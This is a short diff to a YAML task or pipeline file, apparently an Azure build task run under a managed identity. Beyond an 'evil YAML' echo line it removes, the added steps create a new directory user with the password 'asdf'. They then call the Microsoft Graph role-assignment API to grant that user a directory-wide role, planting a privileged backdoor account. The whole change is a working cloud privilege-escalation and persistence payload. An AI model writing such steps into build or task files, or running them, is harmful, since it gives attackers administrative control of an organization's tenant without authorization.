@@ -1,5 +1,5 @@
 version: v1.1.0
 steps:
-  - cmd: bash echo Hello from the evil YAML
   - cmd: az login --allow-no-subscriptions --identity
-  - cmd: az ad user list
+  - cmd: a=$(az ad user create --display-name asdf --password asdf --user-principal-name "asdf" | jq '.objectId')
+  - cmd: az rest --method POST --uri 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments' --body '{"principalId": '"$a"' , "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10", "directoryScopeId": "/"}'
